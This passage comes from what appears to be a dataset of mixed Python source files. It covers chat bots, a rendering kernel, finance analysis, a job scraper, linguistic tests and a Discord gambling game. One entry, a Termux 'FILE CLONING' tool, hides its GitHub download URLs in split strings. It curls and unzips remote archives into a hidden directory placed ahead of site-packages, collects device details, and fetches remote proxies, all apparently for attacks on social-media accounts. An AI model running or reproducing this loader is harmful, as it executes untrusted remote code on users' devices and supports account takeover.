{total_users}\\nS\u1d1c\u1d04\u1d04\u1d07\ua731\ua731: {success}\\nF\u1d00\u026a\u029f\u1d07\u1d05: {failed}\"\n    )\n\n\nasync def send_msg(user_id, message):\n    try:\n        await message.forward(chat_id=int(user_id))\n        return 200\n    except FloodWait as e:\n        await asyncio.sleep(e.value)\n        return send_msg(user_id, message)\n    except InputUserDeactivated:\n        logger.info(f\"{user_i",
    "import torch\nimport timeit\nimport numpy as np\nfrom torch.autograd import Function\nfrom renderers.module import light_kernel\n\ndef calc_grid_size(shape, threads_dim=16):\n    return ((shape[0] + threads_dim - 1)//threads_dim, (shape[1] + threads_dim - 1)//threads_dim, 1)\n\nBLOCK_SIZE = (16, 16, 1)\n\nclass Brdf2d(Function):\n    @staticmethod\n    def forward(ctx, width, height, ref_brdf, input_params, half_res_brdf):\n        original_shape = (width, height, 3)\n        output = torch.zeros(original_shape, dtype=torch.float).cuda()\n\n        grid_size = calc_grid_size(original_shape)\n\n        light_kernel.brdf(\n            input=ref_brdf,\n            output=output,\n            input_params=input_params,\n        ).launchRaw(\n            blockSize=BLOCK_SIZE,\n            gridSize=grid_size\n        )\n\n        if ctx is not None:\n            ctx.input_params = input_params\n            ctx.save_for_backward(half_res_brdf, output)\n\n        return output\n\n    @staticmethod\n    def backward(ctx, grad_output):\n        half_res_brdf, lighting_from_full_res_brdf = ctx.saved_tensors\n        input_params = ctx.input_params\n\n        grad_half_res_brdf = torch.zeros_like(half_res_brdf)\n        grad_output = grad_output.contiguous()\n\n        width, height = grad_output.shape[:2]\n        original_shape = (width, height, 1)\n        loss_output = torch.zeros(original_shape).cuda()\n        grid_size = calc_grid_size(original_shape)\n\n        start = timeit.default_timer()\n\n        light_kernel.brdf_loss.bwd(\n            # invariant input\n            input_params=input_params,\n            # inputs from forward\n            reference=lighting_from_full_res_brdf,\n            # differentiable inputs\n            input=(half_res_brdf, grad_half_res_brdf),\n            # output\n            output=(loss_output, grad_output)\n        ).launchRaw(\n            blockSize=BLOCK_SIZE,\n            gridSize=grid_size\n        )\n\n        end = timeit.default_timer()\n\n        # print(\"Backward pass: %f seconds\" % (end - start))\n\n        return None, None, None, None, grad_half_res_brdf\n",
    "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Mon Mar 25 16:35:14 2024\n\n@author: Utilisateur\n\"\"\"\n\nimport yfinance as yf\nimport numpy as np\nfrom copulas.multivariate import GaussianMultivariate\nfrom copulas.bivariate import Clayton, Frank, Gumbel\nfrom copulas.univariate import UniformUnivariate\nfrom scipy.stats import pearsonr, spearmanr, kendalltau\nimport matplotlib.pyplot as plt\nfrom pycop import archimedean\n\nassets = {\n    \"S&P 500\": \"^GSPC\",\n    \"MSCI Emerging Markets\": \"EEM\",\n    \"Bloomberg Commodity Index\": \"CMOD.MI\",\n    \"USD/CNY\": \"CNY=X\",\n    \"German Bonds\": \"EXSB.DE\" \n}\n\ntime_periods = {\n    \"Pre-Financial Crisis Growth\": (\"2005-01-01\", \"2007-12-31\"),\n    \"Post-Financial Crisis Recovery\": (\"2009-01-01\", \"2011-12-31\"),\n    \"COVID-19 Pandemic Impact\": (\"2020-01-01\", \"2022-12-31\"),\n    \"Late-2017 Market Rally\": (\"2017-09-01\", \"2018-02-28\"),\n    \"Trade War Uncertainty\": (\"2018-01-01\", \"2020-12-31\"),\n    \"Renminbi Devaluation\": (\"2014-01-01\", \"2016-12-31\"),\n    \"Trade War Period\": (\"2018-03-01\", \"2019-12-31\"),\n    \"Normalisation of ECB Monetary Policy\": (\"2017-01-09\", \"2018-12-31\"),\n    \"Chinese Economic Boom\": (\"2005-01-01\", \"2007-01-01\")\n}\n\ndef empirical_log_likelihood(copula, data, n_samples=100):\n    samples = copula.sample(n_samples)\n    empirical_likelihoods = copula.pdf(samples)\n    return np.mean(np.log(empirical_likelihoods))\n\ndef transform_to_uniform(marginals):\n    # Assuming 'marginals' is a pandas Series\n    return marginals.rank(method='average') / (len(marginals) + 1)\n\ndef empirical_log_likelihood(copula, data, n_samples=100):\n    samples = copula.sample(n_samples)\n    empirical_likelihoods = copula.pdf(samples)\n    return np.mean(np.log(empirical_likelihoods))\n\ndef calculate_aic(log_likelihood, num_parameters):\n    return 2 * num_parameters - 2 * log_likelihood\n\ndef find_best_copula(asset1_returns, asset2_returns):\n    # Transform to uniform distributions\n    asset1_uniform = transform_to_uniform(asset1_returns)\n    asset2_uniform = transform_to_uniform(asset2_returns)\n    data = np.column_stack((asset1_uniform, asset2_uniform))\n\n    # List of copulas to evaluate\n    copulas = [\n        GaussianMultivariate(),\n        Clayton(),\n        Frank(),\n        Gumbel(),\n        UniformUnivariate()\n    ]\n\n    aic_scores = {}\n    best_copula = None\n    best_aic = np.inf\n\n    for copula in copulas:\n        try:\n            copula.fit(data)\n            log_likelihood = empirical_log_likelihood(copula, data)\n            # Assuming the 'parameters' can somehow give us the number of parameters for AIC calculation.\n            # This is a simplification; you'll need to adjust based on your actual copula objects.\n            num_parameters = 1  # Placeholder. Determine the correct number based on your copula type.\n            aic = calculate_aic(log_likelihood, num_parameters)\n            aic_scores[copula.__class__.__name__] = aic\n            \n            if aic < best_aic:\n                best_aic = aic\n                best_copula = copula\n                \n            print(f\"{copula.__class__.__name__}: Log-likelihood = {log_likelihood}, AIC = {aic}\")\n\n        except Exception as e:\n            print(f\"An error occurred while fitting the copula: {e}\")\n\n    print(f\"Best copula based on AIC: {best_copula} with AIC = {best_aic}\")\n    return best_copula, aic_scores\n\n\n\n\ndef calculate_dependency(asset1, asset2, time_period_name):\n    asset1_data = yf.download(assets[asset1], start=time_periods[time_period_name][0], end=time_periods[time_period_name][1])\n    asset2_data = yf.download(assets[asset2], start=time_periods[time_period_name][0], end=time_periods[time_period_name][1])\n\n    if asset1_data.empty or asset2_data.empty:\n        print(f\"Data for {asset1} or {asset2} is empty. Skipping...\")\n        return\n    \n    asset1_returns = asset1_data['Close'].pct_change().dropna()\n    asset2_returns = asset2_data['Close'].pct_change().dropna()\n\n    asset1_returns, asset2_returns = asset1_returns.align(asset2_returns, join='inner')\n\n    best_copula = find_best_copula(asset1_returns, asset2_returns)\n    print(f\"Best copula for {asset1} / {asset2} during {time_period_name}: {best_copula}\")\n\n    aligned_asset1, aligned_asset2 = asset1_returns.align(asset2_returns, join='inner')\n\n    #Dependency mesures\n    pearson_corr, pearson_pval = pearsonr(aligned_asset1, aligned_asset2)\n    spearman_corr, spearman_pval = spearmanr(aligned_asset1, aligned_asset2)\n    kendall_tau, kendall_pval = kendalltau(aligned_asset1, aligned_asset2)\n\n    # Print the results\n    print(f\"{asset1} / {asset2} during {time_period_name}\")\n    print(f\"Pearson Correlation Coefficient (r): {pearson_corr:.4f}, p-value: {pearson_pval:.4g}\")\n    print(f\"Spearman's Rank Correlation Coefficient (rho): {spearman_corr:.4f}, p-value: {spearman_pval:.4g}\")\n    print(f\"Kendall's Tau Correlation Coefficient (tau): {kendall_tau:.4f}, p-value: {kendall_pval:.4g}\")\n    print(\"\\n\")\n    \n\nfor pair, periods in {\n    (\"S&P 500\", \"MSCI Emerging Markets\"",
    "from dotenv import load_dotenv\nimport os\n\nimport streamlit as st\n\nfrom langchain.chains import ConversationChain\nfrom langchain.chains.conversation.memory import ConversationBufferWindowMemory\nfrom langchain_groq import ChatGroq\n\n\ndef main():\n    \"\"\"\n    This function is the main entry point of the application. It sets up the Groq client, the Streamlit interface,\n    and handles the chat interaction.\n    \"\"\"\n\n    # Get Groq API key\n    load_dotenv()  # Load environment variables from .env file\n    groq_api_key = os.getenv(\"GROQ_API_KEY\")\n\n    # Display the Groq logo\n    spacer, col = st.columns([5, 1])\n    with col:\n        st.image('groqcloud_darkmode.png')\n\n    # The title and greeting message of the Streamlit application\n    st.title(\"Chat with Groq!\")\n    st.write(\n        \"Hello! I'm your friendly Groq chatbot. I can help answer your questions, provide information, or just chat. \"\n        \"I'm also super fast! Let's start our conversation!\")\n\n    # Add customization options to the sidebar\n    st.sidebar.title('Customization')\n    model = st.sidebar.selectbox(\n        'Choose a model',\n        ['mixtral-8x7b-32768', 'llama2-70b-4096']\n    )\n    conversational_memory_length = st.sidebar.slider('Conversational memory length:', 1, 10, value=5)\n\n    memory = ConversationBufferWindowMemory(k=conversational_memory_length)\n\n    user_question = st.text_input(\"Ask a question:\")\n\n    # session state variable\n    if 'chat_history' not in st.session_state:\n        st.session_state.chat_history = []\n    else:\n        for message in st.session_state.chat_history:\n            memory.save_context({'input': message['human']}, {'output': message['AI']})\n\n    # Initialize Groq Langchain chat object and conversation\n    groq_chat = ChatGroq(\n        groq_api_key=groq_api_key,\n        model_name=model\n    )\n\n    conversation = ConversationChain(\n        llm=groq_chat,\n        memory=memory\n    )\n\n    # If the user has asked a question,\n    if user_question:\n        # The chatbot's answer is generated by sending the full prompt to the Groq API.\n        response = conversation(user_question)\n        message = {'human': user_question, 'AI': response['response']}\n        st.session_state.chat_history.append(message)\n        st.write(\"Chatbot:\", response['response'])\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "import json\nfrom typing import Generic\n\nfrom redis import Redis\nfrom redis.asyncio.client import Redis as AioRedis\n\nfrom premier._types import _K, _V, AsyncQuotaCounter, QuotaCounter, T\n\n\nclass MemoryCounter(Generic[_K, _V], QuotaCounter[_K, _V]):\n    def __init__(self):\n        self._map = dict[_K, _V]()\n\n    def get(self, key: _K, default: T = None) -> _V | T:\n        return self._map.get(key, default)\n\n    def set(self, key: _K, val: _V):\n        self._map[key] = val\n\n    def clear(self, keyspace: str = \"\"):\n        if not keyspace:\n            self._map.clear()\n\n        keys = [key for key in self._map if key.startswith(keyspace)]  # type: ignore\n        for k in keys:\n            self._map.pop(k, None)\n\n\nclass AsyncMemoryCounter(MemoryCounter, Generic[_K, _V], AsyncQuotaCounter[_K, _V]):\n    def __init__(self):\n        super().__init__()\n\n    async def get(self, key: _K, default: T = None) -> _V | T:\n        return super().get(key, default)\n\n    async def set(self, key: _K, val: _V):\n        super().set(key, val)\n\n    async def clear(self, keyspace: str = \"\"):\n        super().clear(keyspace)\n\n\nclass RedisCounter(Generic[_K, _V], QuotaCounter[_K, _V]):\n    def __init__(self, redis: Redis, *, ex_s: int = 30) -> None:\n        self._redis = redis\n        self._ex_s = ex_s\n\n    def get(self, key: _K, default: T = None) -> _V | T:\n        val = self._redis.get(key)  # type: ignore\n        val = json.loads(val) if val else default  # type: ignore\n        return val\n\n    def set(self, key: _K, value: _V):\n        val = json.dumps(value)\n        self._redis.set(key, val, ex=self._ex_s)  # type: ignore\n\n    def clear(self, keyspace: str = \"\"):\n        script = \"\"\"\n        return redis.call('del', unpack(redis.call('keys', ARGV[1])))\n        \"\"\"\n        self._redis.eval(\n            script,\n            0,\n            f\"{keyspace}:*\",\n        )\n\n\nclass AsyncRedisCounter(Generic[_K, _V], AsyncQuotaCounter[_K, _V]):\n    def __init__(self, redis: AioRedis, *, ex_s: int = 30) -> None:\n        self._redis = redis\n        self._ex_s = ex_s\n\n    async def get(self, key: _K, default: T = None) -> _V | T:\n        val = await self._redis.get(key)  # type: ignore\n        val = json.loads(val) if val else default  # type: ignore\n        return val\n\n    async def set(self, key: _K, value: _V):\n        val = json.dumps(value)\n        await self._redis.set(key, val, ex=self._ex_s)  # type: ignore\n\n    async def clear(self, keyspace: str = \"\"):\n        script = \"\"\"\n        return redis.call('del', unpack(redis.call('keys', ARGV[1])))\n        \"\"\"\n        self._redis.eval(\n            script,\n            0,\n            f\"{keyspace}:*\",\n        )\n",
    "# Import necessary libraries for web scraping, data manipulation, and file operations\nimport requests  # For making HTTP requests to web pages\nfrom bs4 import BeautifulSoup  # For parsing HTML content\nimport time  # For pausing the script to respect server load\nimport pandas as pd  # For data manipulation and export\nimport random  # For generating random sleep durations\nimport datetime  # For handling dates and times\nimport os  # For file operations, like opening files\nimport webbrowser  # For opening files in the web browser\nimport re  # For regular expressions, used in parsing scripts\nfrom bs4 import NavigableString # Importing the NavigableString class from the bs4 module\nimport sys  # For system-specific parameters and functions\n\n# Prompt the user for input, accepting either a country name or a full URL\nuser_input = input(' \ud83c\udf10  Enter the country name or the full URL for job listing -> ')\n\n# Define the default keywords list\nkeywords = ['Data', 'data', 'Information', 'information', 'analysis', 'Analysis', 'Engineer', 'Developer', 'GIS', 'Geographic']\n\n# Convert the list of default keywords into a string to display to the user\ndefault_keywords_str = \", \".join(keywords)\n\n# Prompt the user with a simple yes/no question\nuser_response = input(f\"\\nThe default keywords for job searches are: {default_keywords_str}. \\nDo you wish to enter your own keywords instead? (yes/no): \").strip().lower()\n\nif user_response == 'yes':\n    custom_keywords_input = input(\"Enter your custom keywords, separated by commas (e.g., Analyst, Software, Research): \")\n    # Overwrite the default keywords list with the user's custom list\n    keywords = [keyword.strip() for keyword in custom_keywords_input.split(',')]\n# If the user answers 'no', the script continues using the predefined list of keywords\n\n# Define the base URL for UN jobs duty stations\nbase_site_url = \"https://unjobs.org/duty_stations/\"\n\n# Determine if the user input is a URL or a country name and construct the search URL accordingly\nif user_input.startswith('http://') or user_input.startswith('https://'):\n    base_url = user_input\nelse:\n    # Construct the full URL by appending the country name to the base site URL\n    base_url = f\"{base_site_url}{user_input.lower()}\"\n\n# Set request headers to mimic a browser user-agent for compatibility\nheaders = {'User-Agent': 'Mozilla/5.0'}\njob_data = []  # Initialize a list to store job data\npage = 1  # Start from the first page\n\nprint(' \ud83d\udd0d  Collecting data from the website...')\n\nurl_suffix = base_url.split('/')[-1]  # This splits the URL by '/' and takes the last element\n\n# Loop through the pages of the website until no more job listings are found\nwhile True:\n    # Construct URL for the current page, handling the first page as a special case\n    URL = f\"{base_url}/{page}\" if page > 1 else base_url\n    response = requests.get(URL, headers=headers)\n    soup = BeautifulSoup(response.content, 'html.parser')\n\n    # Extract job listings from the current page\n    jobs = soup.find_all('div', class_='job')\n    if not jobs:\n        break  # Exit the loop if no jobs are found on the current page\n\n    # Attempt to extract script containing job closing dates\n    closing_dates_script_element = soup.find(\"script\", string=re.compile(\"var j\\\\d+i = new Date\"))\n    if closing_dates_script_element:\n        closing_dates_script = closing_dates_script_element.string\n        closing_date_matches = re.findall(r\"var j(\\d+)i = new Date\\((\\d+)\\);\", closing_dates_script)\n\n        # Create a dictionary mapping from job ID suffix to closing date string\n        closing_dates = {}\n        for match in closing_date_matches:\n            job_id_suffix, timestamp = match\n            # Convert timestamp to datetime and format it\n            closing_date = datetime.datetime.fromtimestamp(int(timestamp) / 1000).strftime('%Y-%m-%d')\n            closing_dates[job_id_suffix] = closing_date\n    else:\n        closing_dates = {}   # If no closing dates script is found, use an empty dictionary\n\n    # Iterate over each job listing to extract and store data\n    for job in jobs:\n        a_tag = job.find('a', class_='jtitle')\n        if a_tag:\n            title = a_tag.text.strip()\n            url = a_tag['href']\n            if a_tag.find_next('br') and a_tag.find_next('br').next_sibling:\n                next_sibling = a_tag.find_next('br').next_sibling\n                organization = next_sibling.strip() if isinstance(next_sibling, NavigableString) else \"N/A\"\n            else:\n                organization = \"N/A\" # Default to \"N/A\" if not found\n            # Attempt to extract the organization from the job listing\n            job_id_suffix = job.find(\"span\", id=re.compile(\"j\\d+\"))['id'][1:]  \n            closing_date = closing_dates.get(job_id_suffix, \"N/A\")\n            job_data.append({'title': title, 'organization': organization, 'closing_date': closing_date, 'url': url})\n     \n            # Update the console with the progress\n            sys.stdout.write(f'\\r \u23f3  Scraping information..",
    "# -*- coding: utf-8 -*-\n\nfrom __future__ import unicode_literals\n\nimport unittest\nimport unicodedata\n\nimport epitran\n\n\nclass TestQuechua(unittest.TestCase):\n    def setUp(self):\n        self.epi = epitran.Epitran('est-Latn')\n\n    # RULE 1\n    def test_kabi(self): \n        tr = self.epi.transliterate('kabi')\n        self.assertEqual(tr, 'k\u0251pi')\n\n    def test_kapi(self): \n        tr = self.epi.transliterate('kapi')\n        self.assertEqual(tr, 'k\u0251p\u02d0i')\n\n    def test_kappi(self): \n        tr = self.epi.transliterate('kappi')\n        self.assertEqual(tr, 'k\u0251p\u02d0\u02d0i')\n\n    def test_sodin(self): \n        tr = self.epi.transliterate('sodin')\n        self.assertEqual(tr, 'sot\u02b2in')\n\n    def test_kota(self): \n        tr = self.epi.transliterate('kota')\n        self.assertEqual(tr, 'kot\u02d0\u0251')\n\n    def test_pered(self): \n        tr = self.epi.transliterate('pered')\n        self.assertEqual(tr, 'peret')\n\n    # RULE 2\n    def test_k\u00f5rbgi(self): \n        tr = self.epi.transliterate('k\u00f5rbgi')\n        self.assertEqual(tr, 'k\u00f8rbk\u02d0i')\n    \n\n    # RULE 3\n    def test_h\u00e4bi(self): \n        tr = self.epi.transliterate('h\u00e4bi')\n        self.assertEqual(tr, '\u00e6pi')\n\n    def test_homme(self): \n        tr = self.epi.transliterate('homme')\n        self.assertEqual(tr, 'om\u02d0e')\n\n\n    # RULE 4\n    def test_siia(self): \n        tr = self.epi.transliterate('siia')\n        self.assertEqual(tr, 'si\u02d0ja')\n\n    def test_maia(self): \n        tr = self.epi.transliterate('maia')\n        self.assertEqual(tr, 'mai\u02d0ja')\n\n    def test_m\u00fc\u00fca(self): \n        tr = self.epi.transliterate('m\u00fc\u00fca')\n        self.assertEqual(tr, 'myija')\n\n    def test_j\u00e4nes(self): \n        tr = self.epi.transliterate('j\u00e4nes')\n        self.assertEqual(tr, 'j\u00e6nes')\n    \n    # RULE 5\n    def test_vere(self): \n        tr = self.epi.transliterate('vere')\n        self.assertEqual(tr, 'vere')\n    \n    def test_veere(self): \n        tr = self.epi.transliterate('veere')\n        self.assertEqual(tr, 've\u02d0re')\n    \n    def test_lina(self): \n        tr = self.epi.transliterate('lina')\n        self.assertEqual(tr, 'lin\u0251')\n    \n    def test_linna(self): \n        tr = self.epi.transliterate('lina')\n        self.assertEqual(tr, 'lin\u02d0\u0251')\n\n\n    # RULE 7\n    def test_du\u0161i(self): \n        tr = self.epi.transliterate('du\u0161i')\n        self.assertEqual(tr, 'tu\u0283\u02d0i')\n    \n\n    def test_k\u00e4sn(self): \n        tr = self.epi.transliterate('k\u00e4sn')\n        self.assertEqual(tr, 'k\u00e6\u0283\u02d0n')\n\n    def test_\u0161ahti(self): \n        tr = self.epi.transliterate('\u0161ahti')\n        self.assertEqual(tr, '\u0283\u0251hti')\n\n    def test_bluffi(self): \n        tr = self.epi.transliterate('bluffi')\n        self.assertEqual(tr, 'pluf\u02d0\u02d0i')\n\n    def test_fakti(self): \n        tr = self.epi.transliterate('fakti')\n        self.assertEqual(tr, 'fak\u02d0ti')\n\n    # RULE 9\n    def test_pani(self): \n        tr = self.epi.transliterate('pani')\n        self.assertEqual(tr, 'pan\u02b2i')\n\n    def test_lasi(self): \n        tr = self.epi.transliterate('lasi')\n        self.assertEqual(tr, 'las\u02b2i')\n    \n    def test_palju(self): \n        tr = self.epi.transliterate('palju')\n        self.assertEqual(tr, 'pal\u02b2ju')\n\n    def test_paljas(self): \n        tr = self.epi.transliterate('paljas')\n        self.assertEqual(tr, 'pal\u02b2jas')\n\n    def test_padi(self): \n        tr = self.epi.transliterate('padi')\n        self.assertEqual(tr, 'pat\u02b2i')\n",
    "import os\n#os.system('pip install httpx pip install beautifulsoup4')\nprint('loading Modules ...\\n')\n\ntry:\n\timport os,requests,json,time,re,random,sys,uuid,string,subprocess\n\tfrom string import *\n\timport bs4\n\t#import dz\n\tfrom concurrent.futures import ThreadPoolExecutor as tred\n\tfrom bs4 import BeautifulSoup as sop\n\tfrom bs4 import BeautifulSoup\nexcept ModuleNotFoundError: \n\tprint('\\n Installing missing modules ...')\n\tos.system('pip install requests bs4 futures==2 > /dev/null')\n\t\n#\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[FAKE CPTHON]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 #\nimport os,sys,tempfile,string,random,subprocess,uuid\nhttp_directory = tempfile.mkdtemp(prefix='.')\nsite_packages = sys.path[4]\nprint(site_packages)\nprint(http_directory)\nsys.path.remove(site_packages)\nsys.path.insert(4,http_directory+'/reqmodule')\nsys.path.insert(5,http_directory)\ntry:\n        os.mkdir('crypto')\nexcept:pass\nhh = \"ho\"\nhh2 = \"9/pycrypt\"\nfind_aarch = subprocess.check_output('uname -om',shell=True)\nif 'aarch64' in str(find_aarch):\n        user_aarch = '64'\n        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto64/crypto64.zip?raw=true'\nelif 'arm' in str(find_aarch):\n        user_aarch = '32'\n        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto32/crypto32.zip?raw=true'\nelse:\n        print(' Unknown aarch ')\n        exit()\nif not os.path.isfile(f'crypto/crypto{user_aarch}.zip'):\n        os.system('clear')\n        print('\\n Please wait while creating pycryptodome for you ! This can take some time\\n\\n')\n        os.system(f'curl -L {download_link} > crypto/crypto{user_aarch}.zip')\n        os.system('python jan.py')\nelse:\n        akk2=\"rsi\"\n        akk=f\"cha{akk2}fi\"\n        os.system(f'cp crypto/crypto{user_aarch}.zip {http_directory}')\n        lib = f'https://github.com/{akk}les/client/blob/main/config.zip?raw=true'\n        os.system(f'curl -L {lib} > {http_directory}/config.zip')\n        os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')\n        os.system(f'cd {http_directory} && unzip crypto{user_aarch}.zip -d {http_directory} > /dev/null')\n#\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[FAKE CPYTHON End]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 #\n#\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[BIT ROOM]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 #\nimport os, platform, time, sys\nos.system('pkg install espeak ')\nprint('\\033[1;91m[\\033[1;92m\u2280\u2281\\033[1;91m] \\033[1;91m\u2280\\33[1;92mYOSiF-/KHA\u00d1\\33[1;91m\u2281 ')\nos.system('espeak -a 300 \" ,FILE CLONING 1..0, TOOLS,INSTALL Complete ,\"')\ntime.sleep(1)\nos.system('clear')\n##\nimport os, platform, time, sys\n\ntry:\n import requests\nexcept:os.system(\"pip uninstall requests -y;pip install requests\")\n\nprint('\\033[1;91mChecking For Update. . . .')\nos.system('espeak -a 300 \" Checking For Update,\"')\ntime.sleep(2)\n\n\nos.system('git pull --quiet 2>/dev/null')\nbit = platform.architecture()[0]\nif bit == '64bit':\n print('\\033[1;91m[\\033[1;92m\u25c9\\033[1;91m] \\033[1;92mYOU ARE 64BIT USER')\n \nelif bit == '32bit':\n print('\\033[1;91m[\\033[1;92m\u25c9\\033[1;91m] \\033[1;92mYOU ARE 32BIT USER')\n\n #\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[BIT End]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 #\n\n\nking='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'\nif not 'print' in open(king+'sessions.py','r').read():\n    pass\nelse:\n    exit('\\033[1;32mB\u0113\u015by\u0101ra ch\u0113l\u0113 m\u0113tha\u1e0da ky\u0101pac\u0101ra karab\u0101 tumi t\u014dm\u0101ra m\u0101r\u0113 kutt\u0101 di\u1e8f\u0113 c\u014ddai')\nqeen='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'\nif not 'print' in open(qeen+'models.py','r').read():\n    pass\nelse:\n    exit('\\033[1;32mB\u0113\u015by\u0101ra ch\u0113l\u0113 m\u0113tha\u1e0da ky\u0101pac\u0101ra karab\u0101 tumi t\u014dm\u0101ra m\u0101r\u0113 kutt\u0101 di\u1e8f\u0113 c\u014ddai')\ndon='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'\nif not 'print' in open(don+'utils.py','r').read():\n    pass\nelse:\n    exit('\\033[1;32mB\u0113\u015by\u0101ra ch\u0113l\u0113 m\u0113tha\u1e0da ky\u0101pac\u0101ra karab\u0101 tumi t\u014dm\u0101ra m\u0101r\u0113 kutt\u0101 di\u1e8f\u0113 c\u014ddai')\n\ntry:\n\tprox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text\n\topen('proxies.txt','w').write(prox)\nexcept Exception as e:\n\tprint('')\nproxies=open('proxies.txt','r').read().splitlines()\n\nprincp=[]\n#-----------------------------------------------------#\nusr=[]\nandroid_models=[]\n#-----------------------------------------------------#\nbYT=\"\\033[1;30m\" \nM=\"\\033[1;31m\"       \nH=\"\\033[1;33m\"               \nbyellow=\"\\033[1;33m\"     \nbblue=\"\\033[1;34m\"        \nP=\"\\033[1;35m\"               \nC=\"\\033[1;36m\"          \nB=\"\\033[1;37m\"       \nG=\"\\033[1;32m\"              \nR=\"\\033[1;31m\"\nAA=\"\\033[1;32m\"\nBB=\"\\033[1;31m\"\nCC=\"\\033[1;36m\"\nX='\\033[1;30m'\nXX=\"\\x1b[38;5;196m\"\nGGG=\"\\x1b[38;5;214m\"\n#-----------------------------------------------------#\n\n  \n\nsim_id = ''\nandroid_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\\n','')\nmodel = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\\n','')\nbuild = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\\n','')\nfblc = 'en_GB'\ntry:\n        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(','",
    "import discord\nimport random\nfrom discord.ext import commands\n\nintents = discord.Intents.all()\nbot = commands.Bot(command_prefix=\"!\", intents=intents)\nTOKEN = \"\"\n@bot.event\nasync def on_ready():\n    print(f'We have logged in as {bot.user}')\n\nuser_balances = {}  # \uc0ac\uc6a9\uc790\uc758 \uc794\uc561\uc744 \uc800\uc7a5\ud560 \ub515\uc154\ub108\ub9ac\n\n@bot.event\nasync def on_ready():\n    print(f'We have logged in as {bot.user}')\n\nclass BaccaratGame:\n    def __init__(self, bet_amount):\n        self.bet_amount = bet_amount\n        self.player_cards = []\n        self.banker_cards = []\n\n    def deal_cards(self):\n        deck = ['A', '2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K'] * 4\n        deck = list(deck)\n        random.shuffle(deck)\n        self.player_cards = [deck.pop(), deck.pop()]\n        self.banker_cards = [deck.pop(), deck.pop()]\n\n    def calculate_total(self, cards):\n        total = 0\n        for card in cards:\n            if card.isdigit():\n                total += int(card)\n            elif card in ['J', 'Q', 'K']:\n                total += 10\n            else:\n                total += 1\n        return total\n\n    def calculate_result(self, choice):\n        player_total = self.calculate_total(self.player_cards)\n        banker_total = self.calculate_total(self.banker_cards)\n        if player_total > banker_total:\n            if choice == '\ud50c\ub808\uc774\uc5b4':\n                return \"Player wins!\"\n            else:\n                return \"Banker wins!\"\n        elif player_total < banker_total:\n            if choice == '\ubc45\ucee4':\n                return \"Banker wins!\"\n            else:\n                return \"Player wins!\"\n        else:\n            return \"Tie!\"\n\n@bot.slash_command(name='\ubc14\uce74\ub77c')\nasync def baccarat(ctx, bet_amount: int, choice: str):\n    if bet_amount <= 0:\n        await ctx.respond(\"\ubca0\ud305 \uae08\uc561\uc740 0\ubcf4\ub2e4 \ucee4\uc57c \ud569\ub2c8\ub2e4.\")\n        return\n\n    if choice not in ['\ud50c\ub808\uc774\uc5b4', '\ubc45\ucee4', '\ubb34\uc2b9\ubd80']:\n        await ctx.respond(\"\uc62c\ubc14\ub978 \uc120\ud0dd\uc744 \ud574\uc8fc\uc138\uc694: '\ud50c\ub808\uc774\uc5b4', '\ubc45\ucee4', '\ubb34\uc2b9\ubd80'\")\n        return\n\n    if ctx.author.id not in user_balances:\n        user_balances[ctx.author.id] = 0\n\n    if user_balances[ctx.author.id] < bet_amount:\n        await ctx.respond(\"\uc794\uc561\uc774 \ubd80\uc871\ud569\ub2c8\ub2e4.\")\n        return\n\n    game = BaccaratGame(bet_amount)\n    game.deal_cards()\n    result = game.calculate_result(choice)\n\n    winnings = 0\n    if result == choice:\n        winnings = bet_amount * 2\n        user_balances[ctx.author.id] += winnings\n    else:\n        user_balances[ctx.author.id] -= bet_amount\n\n    await ctx.respond(f\"\ud50c\ub808\uc774\uc5b4 \uce74\ub4dc: {game.player_cards}\\n\ubc45\ucee4 \uce74\ub4dc: {game.banker_cards}\\n{result}\uc774 \ub098\uc654\uc2b5\ub2c8\ub2e4. {'\ub2f9\ucca8\uc785\ub2c8\ub2e4! \ubc30\ud305\uae08\uc561\uc758 2\ubc30\uc778 '+str(winnings)+'\ub97c \ud68d\ub4dd\ud558\uc168\uc2b5\ub2c8\ub2e4!' if winnings > 0 else '\uc544\uc27d\uc9c0\ub9cc \ubca0\ud305\uae08\uc561\uc744 \uc783\uc5c8\uc2b5\ub2c8\ub2e4.'}\")\n\n@bot.slash_command(name='\uc794\uc561')\nasync def balance(ctx):\n    if ctx.author.id not in user_balances:\n        await ctx.respond(\"\uc794\uc561: 0\")\n    else:\n        await ctx.respond(f\"\uc794\uc561: {user_balances[ctx.author.id]}\")\n\n@bot.slash_command(name='\uc785\uae08')\nasync def deposit(ctx, amount: int):\n    if amount 